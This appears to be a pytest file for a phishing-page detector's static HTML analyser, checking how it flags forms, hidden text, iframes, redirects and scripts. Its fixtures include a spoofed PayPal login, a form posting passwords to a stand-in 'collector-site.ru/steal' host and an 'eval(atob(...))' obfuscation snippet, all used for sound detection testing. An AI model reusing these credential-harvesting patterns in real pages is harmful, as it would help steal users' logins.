"""Layer 4b: static HTML analysis. Pure functions - no I/O anywhere here."""

from __future__ import annotations

from detector.html_analyzer import analyze_html

PAGE_URL = "https://secure-paypa1.com/login"


def test_extracts_title_and_visible_text():
    html = """
    <html><head><title>  Sign in to PayPal  </title>
    <style>.x{color:red}</style>
    <script>var secret = "never visible";</script></head>
    <body><h1>Confirm your account</h1><p>Your account is limited.</p></body></html>
    """
    s = analyze_html(PAGE_URL, html)

    assert s.title == "Sign in to PayPal"
    assert "Confirm your account" in s.text
    assert "never visible" not in s.text      # <script> excluded
    assert "color:red" not in s.text          # <style> excluded


def test_malformed_html_never_raises():
    for html in ["<html><form><input", "<<<>>>", "", "<div" * 500]:
        s = analyze_html(PAGE_URL, html)
        assert isinstance(s.text, str)
        assert isinstance(s.forms, tuple)


def test_form_action_resolved_and_classified():
    html = """
    <form action="https://collector-site.ru/steal" method="POST">
      <input type="email" name="email">
      <input type="password" name="password">
    </form>
    """
    s = analyze_html(PAGE_URL, html)

    form = s.forms[0]
    assert form.action == "https://collector-site.ru/steal"
    assert form.method == "post"
    assert form.has_password_field is True
    assert form.posts_cross_domain is True
    assert s.has_cross_domain_credential_post is True


def test_same_registered_domain_subdomain_is_not_cross_domain():
    html = '<form action="https://api.example.com/login"><input type="password"></form>'
    s = analyze_html("https://www.example.com/signin", html)
    assert s.forms[0].posts_cross_domain is False


def test_relative_action_resolves_to_page():
    html = '<form action="/submit"><input type="password" name="p"></form>'
    s = analyze_html(PAGE_URL, html)
    assert s.forms[0].action == "https://secure-paypa1.com/submit"
    assert s.forms[0].posts_cross_domain is False


def test_base_href_is_honoured():
    html = ('<head><base href="https://other-host.org/app/"></head>'
            '<form action="submit"><input type="password"></form>')
    s = analyze_html(PAGE_URL, html)
    assert s.forms[0].action.startswith("https://other-host.org/app/")


def test_iframes_split_by_origin():
    html = """
    <iframe src="/local.html"></iframe>
    <iframe src="https://evil-frame.ru/frame"></iframe>
    """
    s = analyze_html(PAGE_URL, html)
    assert len(s.iframes) == 2
    assert len(s.cross_site_iframes) == 1
    assert "https://evil-frame.ru/frame" in s.cross_site_iframes


def test_hidden_text_detected_and_separated():
    html = """
    <body><p>Visible content here</p>
    <div style="display:none">Hidden instructions for scrapers</div>
    <span style="visibility:hidden">also hidden</span></body>
    """
    s = analyze_html(PAGE_URL, html)

    assert "Visible content here" in s.text
    assert "Hidden instructions" not in s.text        # kept out of visible text
    assert "Hidden instructions" in s.hidden_text     # but still reported
    assert s.hidden_element_count >= 2


def test_offscreen_and_zero_size_count_as_hidden():
    html = ('<div style="left:-9999px">offscreen</div>'
            '<div style="font-size:0">tiny</div>'
            '<div width="0">zero</div>')
    s = analyze_html(PAGE_URL, html)
    assert s.hidden_element_count >= 3


def test_hidden_inputs_counted():
    html = ('<form><input type="hidden" name="campaign" value="x">'
            '<input type="password" name="p"></form>')
    s = analyze_html(PAGE_URL, html)
    assert s.hidden_input_count == 1


def test_script_inventory_and_obfuscation_markers():
    html = """
    <script src="https://cdn.othersite.org/lib.js"></script>
    <script>eval(atob("ZG9jdW1lbnQ="));</script>
    <script>var a = 1;</script>
    """
    s = analyze_html(PAGE_URL, html)

    assert s.scripts.total == 3
    assert s.scripts.external_count == 1
    assert "https://cdn.othersite.org/lib.js" in s.scripts.external_sources
    assert "https://cdn.othersite.org/lib.js" in s.scripts.cross_site_sources
    assert "eval" in s.scripts.obfuscation_markers
    assert "atob" in s.scripts.obfuscation_markers


def test_clean_scripts_have_no_markers():
    s = analyze_html(PAGE_URL, "<script>document.querySelector('#x');</script>")
    assert s.scripts.obfuscation_markers == ()


def test_meta_refresh_captured():
    html = '<meta http-equiv="refresh" content="0; url=https://evil-next.ru/next">'
    s = analyze_html(PAGE_URL, html)
    assert s.meta_refresh_to == "https://evil-next.ru/next"


def test_favicon_host_recorded():
    html = '<link rel="icon" href="https://www.paypal.com/favicon.ico">'
    s = analyze_html(PAGE_URL, html)
    assert s.favicon_host == "paypal.com"


def test_text_truncation_flagged():
    html = "<body>" + ("word " * 20000) + "</body>"
    s = analyze_html(PAGE_URL, html, max_text_chars=100)
    assert len(s.text) <= 100
    assert s.text_truncated is True


def test_control_characters_stripped_from_text():
    s = analyze_html(PAGE_URL, "<body>clean\x00text\x1b[31m here</body>")
    assert "\x00" not in s.text
    assert "\x1b" not in s.text


def test_signals_summary_in_as_dict():
    html = """
    <form action="https://collector-site.ru/x" method="post">
      <input type="password" name="p">
      <input name="otp" maxlength="6" inputmode="numeric">
    </form>
    """
    d = analyze_html(PAGE_URL, html).as_dict()
    assert d["signals"]["has_password_field"] is True
    assert d["signals"]["has_otp_field"] is True
    assert d["signals"]["has_cross_domain_credential_post"] is True
    assert "collector-site.ru" in d["signals"]["cross_domain_form_targets"]


def test_safe_page_produces_no_alarming_signals():
    html = """
    <html><head><title>Company blog</title></head>
    <body><h1>Our latest post</h1><p>Ordinary content.</p>
    <form action="/search" method="get"><input name="q" type="text"></form>
    </body></html>
    """
    s = analyze_html("https://example.com/blog", html)

    assert s.has_credential_form is False
    assert s.has_cross_domain_credential_post is False
    assert s.cross_site_iframes == ()
    assert s.scripts.obfuscation_markers == ()
    assert s.hidden_text == ""


def test_hosts_without_a_public_suffix_do_not_collapse_to_one_label():
    """`a.internal` and `b.internal` are different domains.

    Collapsing both to "internal" would make them share a Layer 2 cache entry
    and look same-origin to the cross-domain form check.
    """
    from detector.lexical_features import registered_domain_of

    assert registered_domain_of("http://a.internal/x") == "a.internal"
    assert registered_domain_of("http://b.internal/x") != registered_domain_of(
        "http://a.internal/x")

    html = '<form action="http://b.internal/collect"><input type="password"></form>'
    s = analyze_html("http://a.internal/login", html)
    assert s.forms[0].posts_cross_domain is True
